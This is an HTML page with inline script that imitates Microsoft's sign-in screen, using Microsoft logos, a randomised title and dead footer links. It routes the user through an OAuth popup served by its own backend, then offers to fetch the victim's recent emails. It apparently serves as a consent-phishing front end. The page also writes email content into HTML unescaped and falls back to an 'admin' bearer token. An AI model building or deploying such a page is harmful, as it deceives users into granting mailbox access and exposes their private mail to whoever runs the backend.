<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{(Math.random() + 1).toString(36).substring(2, 80)}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Mobile-first responsive design */
        @media (max-width: 958px) {
            body {
                padding: 5px;
                align-items: flex-start;
                background: white;
            }
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 0;
            width: 100%;
            max-width: 440px;
            animation: fadeIn 0.5s ease-out;
            margin-top: 0;
        }

        /* Mobile container adjustments */
        @media (max-width: 768px) {
            .container {
                padding: 20px 20px;
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .microsoft-logo {
            width: 108px;
            height: auto;
            margin-bottom: 15px;
        }

        .header {
            margin-bottom: 14px;
        }

        .header h1 {
            color: #1b1b1b;
            font-size: 24px;
            font-weight: 600;
            margin: 0;
        }

        /* Compact loading state */
        .container.loading-state .header {
            margin-bottom: 8px;
        }

        .container.loading-state .microsoft-dots-loader {
            margin: 15px 0 20px 0;
        }

        .back-info {
            margin: 10px 0;
            font-size: 13px;
            color: #323130;
            display: none;
        }

        .back-info.visible {
            display: block;
        }

        .status {
            background: #f8f9ff;
            padding: 15px;
            border-radius: 2px;
            margin-bottom: 20px;
            font-size: 13px;
        }

        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }

        .status-indicator.online {
            background: #107c10;
        }

        .status-indicator.offline {
            background: #d13438;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .microsoft-input {
            width: 100%;
            padding: 6px 6px 6px 0;
            border: none;
            border-bottom: 1px solid #0067b8;
            background-color: transparent;
            outline: none;
            font-size: 15px;
            color: #323130;
        }

        .microsoft-input:focus {
            border-bottom: 2px solid #0078d4;
        }

        .microsoft-input::placeholder {
            color: #605e5c;
        }

        .form-links {
            margin: 15px 0;
            font-size: 13px;
        }

        .form-links a {
            color: #0067b8;
            text-decoration: none;
        }

        .form-links a:hover {
            text-decoration: underline;
        }

        .form-links .create-account {
            color: #323130;
        }

        .button-group {
            display: flex;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 20px;
        }

        .btn {
            padding: 6px 32px;
            border: none;
            border-radius: 0;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
        }

        .btn-secondary {
            background-color: #e1e1e1;
            color: #323130;
        }

        .btn-primary {
            background-color: #0078d4;
            color: white;
        }

        .btn:hover:not(:disabled) {
            opacity: 0.9;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .message {
            padding: 12px;
            border-radius: 2px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .message.success {
            background: #dff6dd;
            color: #107c10;
        }

        .message.error {
            background: transparent;
            color: #d13438;
            padding: 2px 0;
            margin: 6px 0 8px 0;
            font-size: 13px;
            line-height: 1.2;
        }

        .message.microsoft-error {
            background: transparent;
            color: #d13438;
            padding: 2px 0;
            margin: 6px 0 8px 0;
            font-size: 13px;
            line-height: 1.2;
        }

        .message.microsoft-error a {
            color: #0067b8;
            text-decoration: underline;
        }

        .message.info {
            background: #deecf9;
            color: #323130;
        }

        .loading {
            display: none;
        }

        .loading-animation {
            position: absolute;
            top: -10px;
            left: 0;
            right: 0;
            height: 2px;
            background: #f3f2f1;
            border-radius: 1px;
            overflow: hidden;
            display: none;
        }

        .loading-animation::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, #0078d4, transparent);
            animation: loadingSlide 1.4s ease-in-out infinite both;
        }

        .loading-animation.active {
            display: block;
        }

        @keyframes loadingSlide {
            0% {
                left: -100%;
            }
            100% {
                left: 100%;
            }
        }

        /* Microsoft-style dot loading animation */
        .microsoft-dots-loader {
            display: none;
            justify-content: flex-start;
            align-items: center;
            margin: 20px 0 15px 0;
            height: 20px;
        }

        .microsoft-dots-loader.show {
            display: flex !important;
        }

        .microsoft-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background-color: #0078d4;
            margin: 0 2px;
            animation: microsoftDotPulse 1.4s infinite ease-in-out both;
        }

        .microsoft-dot:nth-child(1) { animation-delay: -0.32s; }
        .microsoft-dot:nth-child(2) { animation-delay: -0.16s; }
        .microsoft-dot:nth-child(3) { animation-delay: 0s; }
        .microsoft-dot:nth-child(4) { animation-delay: 0.16s; }
        .microsoft-dot:nth-child(5) { animation-delay: 0.32s; }

        @keyframes microsoftDotPulse {
            0%, 80%, 100% {
                transform: scale(0.8);
                opacity: 0.5;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* Loading cancel button */
        .loading-cancel-container {
            display: none;
            margin-top: 20px;
            text-align: left;
        }

        .loading-cancel-container.show {
            display: block !important;
        }

        .cancel-btn {
            background: transparent;
            border: 1px solid #0067b8;
            color: #0067b8;
            font-size: 13px;
            cursor: pointer;
            text-decoration: none;
            padding: 4px 12px;
            border-radius: 2px;
        }

        .cancel-btn:hover {
            color: #004a85;
            border-color: #004a85;
            background: #f3f9ff;
        }

        .cancel-btn:disabled {
            color: #a19f9d;
            border-color: #a19f9d;
            cursor: not-allowed;
            background: transparent;
        }



        /* Pulse animation for Microsoft logo during loading */
        .microsoft-logo.loading {
            animation: logoFadeInOut 2s ease-in-out infinite;
        }

        @keyframes logoFadeInOut {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        .sign-in-options {
            background: white;
            padding: 16px 41px;
            border-radius: 0;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            margin-top: 10px;
            text-align: left;
            font-size: 13px;
            color: #323130;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .sign-in-options img {
            width: 20px;
            height: 20px;
            vertical-align: middle;
        }

        /* Mobile sign-in options */
        @media (max-width: 768px) {
            .sign-in-options {
                padding: 15px 20px;
                margin-top: 8px;
                box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            }
        }



        .hidden {
            display: none;
        }

        .password-section {
            display: none;
        }

        .password-section.visible {
            display: block;
        }

        /* Footer links positioned at bottom right */
        .footer-links {
            position: fixed;
            bottom: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 13px;
            color: #605e5c;
            z-index: 1000;
        }

        .footer-links a {
            color: #605e5c;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .footer-links a:hover {
            color: #323130;
            text-decoration: underline;
        }

        .footer-dots {
            color: #605e5c;
            font-weight: bold;
            cursor: pointer;
            padding: 0 4px;
            user-select: none;
        }

        .footer-dots:hover {
            color: #323130;
        }

        /* Mobile footer adjustments */
        @media (max-width: 768px) {
            .footer-links {
                bottom: 10px;
                right: 10px;
                font-size: 12px;
                gap: 8px;
            }
        }

        /* Hide footer on very small screens to avoid overlap */
        @media (max-width: 480px) {
            .footer-links {
                display: none;
            }
        }
    </style>
</head>
<body>
    <!-- Footer links positioned at bottom right -->
    <div class="footer-links">
        <a href="#" onclick="return false;">Terms of use</a>
        <a href="#" onclick="return false;">Privacy & cookies</a>
        <span class="footer-dots">...</span>
    </div>

    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
        <div class="container">
            <div class="loading-animation" id="loadingAnimation"></div>
            <img class="microsoft-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">

            <div class="back-info" id="backInfo">
                <span id="enteredEmail"></span>
            </div>

            

            <div class="header">
                <h1 id="headerTitle">Sign in to Microsoft</h1>
            </div>

            <!-- Status and messages hidden -->
            <div class="status" style="display: none;">
                <span class="status-indicator" id="statusIndicator"></span>
                <span id="statusText">Checking backend...</span>
            </div>

            <!-- Message area -->
            <div id="messageArea" style="display: none;"></div>

            <!-- Loading indicator -->
            <div class="loading" id="loadingIndicator">
                <p id="loadingText">Processing...</p>
            </div>

            <!-- Microsoft-style dot loading animation -->
            <div class="microsoft-dots-loader" id="microsoftDotsLoader">
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
            </div>

            <!-- Cancel button during loading -->
            <div class="loading-cancel-container" id="loadingCancelContainer">
                <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
            </div>

            <!-- Microsoft OAuth Login form -->
            <div id="oauthForm" style="display: none;">
                <div class="form-group">
                    <p style="color: #323130; font-size: 14px; margin-bottom: 20px;">
                        Click the button below to sign in with your Microsoft account using secure OAuth authentication.
                    </p>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-primary" id="oauthBtn" onclick="startOAuthLogin()" style="width: 100%;">
                        Sign in with Microsoft
                    </button>
                </div>

                <div class="form-links" style="margin-top: 20px;">
                    <span class="create-account">No account? <a href="https://account.microsoft.com/account" target="_blank">Create one!</a></span><br><br>
                    <a href="https://account.live.com/ResetPassword.aspx" target="_blank">Can't access your account?</a>
                </div>
            </div>

            <!-- Success form - shown after authentication -->
            <div id="successForm" class="password-section">
                <div style="text-align: center; padding: 20px 0;">
                    <div style="font-size: 48px; color: #107c10; margin-bottom: 15px;">✅</div>
                    <h2 style="color: #107c10; margin-bottom: 10px;">Successfully signed in!</h2>
                    <p id="userEmail" style="color: #323130; font-size: 14px; margin-bottom: 20px;"></p>
                    
                    <div class="button-group">
                        <button type="button" class="btn btn-primary" onclick="viewEmails()" style="width: 100%;">
                            View My Emails
                        </button>
                    </div>
                    
                    <div style="margin-top: 15px;">
                        <button type="button" class="btn btn-secondary" onclick="logout()" style="width: 100%;">
                            Sign Out
                        </button>
                    </div>
                </div>
            </div>


        </div>

        <!-- Sign-in options -->
        <div class="sign-in-options">
            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" 
                 alt="Sign-in options icon">
            <span>Sign-in options</span>
        </div>
    </div>



    <script>
        let currentSessionId = null;
        let currentStep = 'oauth'; // 'oauth', 'success'
        const API_BASE = '';
        let authWindow = null;

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            setLoading(true, 'Initializing Microsoft Graph API', false);
            
            checkBackendHealth();
            checkExistingSession();
        });

        // Utility functions
        function showMessage(message, type = 'info') {
            const messageArea = document.getElementById('messageArea');
            messageArea.style.display = 'block';
            messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
        }

        function clearMessage() {
            const messageArea = document.getElementById('messageArea');
            messageArea.innerHTML = '';
            messageArea.style.display = 'none';
        }

        function setLoading(loading, loadingText = 'Processing...', useOverlay = false) {
            const loadingAnimation = document.getElementById('loadingAnimation');
            const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
            const microsoftLogo = document.querySelector('.microsoft-logo');
            const container = document.querySelector('.container');
            const oauthForm = document.getElementById('oauthForm');
            const successForm = document.getElementById('successForm');
            const headerTitle = document.getElementById('headerTitle');
            const loadingCancelContainer = document.getElementById('loadingCancelContainer');

            if (loading) {
                // Show progress bar at top
                loadingAnimation.classList.add('active');

                // ENSURE Microsoft logo is visible and add loading animation
                microsoftLogo.style.display = 'block';
                microsoftLogo.style.visibility = 'visible';
                microsoftLogo.classList.add('loading');

                // Add compact loading state to container
                container.classList.add('loading-state');

                // Show dots animation and update header text
                microsoftDotsLoader.classList.add('show');
                microsoftDotsLoader.style.display = 'flex';
                headerTitle.textContent = loadingText;

                // Show cancel button
                loadingCancelContainer.classList.add('show');

                // Hide forms during loading
                oauthForm.style.display = 'none';
                successForm.style.display = 'none';
            } else {
                // Hide all loading animations
                loadingAnimation.classList.remove('active');
                microsoftDotsLoader.classList.remove('show');
                microsoftDotsLoader.style.display = 'none';
                microsoftLogo.classList.remove('loading');
                container.classList.remove('loading-state');

                // Hide cancel button
                loadingCancelContainer.classList.remove('show');

                // Keep Microsoft logo visible (don't hide it)
                microsoftLogo.style.display = 'block';
                microsoftLogo.style.visibility = 'visible';

                // Restore header text based on current step
                if (currentStep === 'oauth') {
                    headerTitle.textContent = 'Sign in to Microsoft';
                    oauthForm.style.display = 'block';
                    successForm.style.display = 'none';
                } else if (currentStep === 'success') {
                    headerTitle.textContent = 'Welcome';
                    oauthForm.style.display = 'none';
                    successForm.style.display = 'block';
                }

                // Restore other elements visibility
                document.getElementById('backInfo').style.display = '';
                document.getElementById('messageArea').style.display = '';
            }

            // Disable all buttons and inputs during loading
            const buttons = document.querySelectorAll('.btn');
            const inputs = document.querySelectorAll('.microsoft-input');

            buttons.forEach(btn => btn.disabled = loading);
            inputs.forEach(input => input.disabled = loading);
        }

        function cancelLoading() {
            // Cancel loading and return to the current form
            setLoading(false);
            clearMessage();
            showOAuthForm();
        }

        function showOAuthForm() {
            currentStep = 'oauth';
            document.getElementById('oauthForm').style.display = 'block';
            document.getElementById('successForm').style.display = 'none';
            document.getElementById('headerTitle').textContent = 'Sign in to Microsoft';
        }

        function showSuccessForm(userEmail) {
            currentStep = 'success';
            document.getElementById('oauthForm').style.display = 'none';
            document.getElementById('successForm').style.display = 'block';
            document.getElementById('headerTitle').textContent = 'Welcome';
            document.getElementById('userEmail').textContent = userEmail;
        }

        // API Functions
        async function checkBackendHealth() {
            try {
                const response = await fetch(`${API_BASE}/api/health`);
                const data = await response.json();

                if (response.ok && data.authConfigured) {
                    console.log('✅ Backend healthy and Azure configured');
                    setLoading(false);
                    showOAuthForm();
                } else {
                    throw new Error('Azure credentials not configured');
                }
            } catch (error) {
                console.error('Backend health check failed:', error);
                setLoading(false);
                showMessage('Backend error: Azure credentials not configured. Please check AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID.', 'error');
                showOAuthForm();
            }
        }

        async function checkExistingSession() {
            try {
                const response = await fetch(`${API_BASE}/api/status`);
                const data = await response.json();

                if (data.authenticated && data.userEmail) {
                    currentSessionId = data.sessionId;
                    setLoading(false);
                    showSuccessForm(data.userEmail);
                    console.log('Found existing authenticated session:', data.userEmail);
                } else {
                    setLoading(false);
                    showOAuthForm();
                }
            } catch (error) {
                console.error('Error checking session status:', error);
                setLoading(false);
                showOAuthForm();
            }
        }

        async function startOAuthLogin() {
            clearMessage();
            setLoading(true, 'Generating secure authentication link', false);

            try {
                const response = await fetch(`${API_BASE}/api/auth-url`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });

                const data = await response.json();

                if (response.ok) {
                    currentSessionId = data.sessionId;
                    
                    // Open OAuth URL in new window
                    authWindow = window.open(data.authUrl, 'microsoftAuth', 'width=600,height=700,scrollbars=yes,resizable=yes');
                    
                    setLoading(true, 'Waiting for Microsoft authentication...', false);
                    
                    // Poll for authentication completion
                    const pollInterval = setInterval(async () => {
                        try {
                            // Check if window is closed
                            if (authWindow.closed) {
                                clearInterval(pollInterval);
                                setLoading(false);
                                showMessage('Authentication cancelled. Please try again.', 'error');
                                return;
                            }

                            // Check backend for authentication status
                            const statusResponse = await fetch(`${API_BASE}/api/status?sessionId=${currentSessionId}`);
                            const statusData = await statusResponse.json();

                            if (statusData.authenticated) {
                                clearInterval(pollInterval);
                                authWindow.close();
                                setLoading(false);
                                showSuccessForm(statusData.userEmail);
                                showMessage('✅ Successfully authenticated with Microsoft!', 'success');
                            }
                        } catch (error) {
                            // Continue polling
                        }
                    }, 2000); // Check every 2 seconds

                    // Timeout after 5 minutes
                    setTimeout(() => {
                        if (authWindow && !authWindow.closed) {
                            authWindow.close();
                        }
                        clearInterval(pollInterval);
                        setLoading(false);
                        showMessage('Authentication timeout. Please try again.', 'error');
                    }, 300000);

                } else {
                    throw new Error(data.error || 'Failed to generate auth URL');
                }

            } catch (error) {
                console.error('OAuth login error:', error);
                setLoading(false);
                showMessage(`Authentication error: ${error.message}`, 'error');
            }
        }

        async function viewEmails() {
            clearMessage();
            setLoading(true, 'Loading your emails...', false);

            try {
                const response = await fetch(`${API_BASE}/api/emails?sessionId=${currentSessionId}&count=10`);
                const data = await response.json();

                if (response.ok) {
                    setLoading(false);
                    
                    // Create a simple email viewer
                    const emailList = data.emails.map(email => 
                        `<div style="border-bottom: 1px solid #e1e1e1; padding: 10px 0;">
                            <strong>${email.subject}</strong><br>
                            <small style="color: #666;">From: ${email.from.emailAddress.name || email.from.emailAddress.address}</small><br>
                            <small style="color: #666;">Date: ${new Date(email.receivedDateTime).toLocaleDateString()}</small><br>
                            <p style="margin: 5px 0; color: #323130;">${email.bodyPreview}</p>
                        </div>`
                    ).join('');

                    // Show emails in a new window or alert
                    const emailWindow = window.open('', 'emails', 'width=800,height=600,scrollbars=yes,resizable=yes');
                    emailWindow.document.write(`
                        <html>
                            <head><title>Your Recent Emails</title></head>
                            <body style="font-family: Segoe UI, sans-serif; padding: 20px;">
                                <h2>Your Recent Emails (${data.count} items)</h2>
                                ${emailList}
                                <br><button onclick="window.close()">Close</button>
                            </body>
                        </html>
                    `);

                    showMessage(`✅ Loaded ${data.count} emails successfully!`, 'success');

                } else {
                    throw new Error(data.error || 'Failed to load emails');
                }

            } catch (error) {
                console.error('Error loading emails:', error);
                setLoading(false);
                showMessage(`Error loading emails: ${error.message}`, 'error');
            }
        }

        async function logout() {
            clearMessage();
            setLoading(true, 'Signing out...', false);

            try {
                if (currentSessionId) {
                    await fetch(`${API_BASE}/api/admin/session/${currentSessionId}`, {
                        method: 'DELETE',
                        headers: { 
                            'Authorization': `Bearer ${global.adminToken || 'admin'}`,
                            'Content-Type': 'application/json' 
                        }
                    });
                }

                currentSessionId = null;
                setLoading(false);
                showOAuthForm();
                showMessage('✅ Signed out successfully!', 'success');

            } catch (error) {
                console.error('Logout error:', error);
                currentSessionId = null;
                setLoading(false);
                showOAuthForm();
                showMessage('Signed out (with errors)', 'info');
            }
        }


    </script>
</body>
</html>
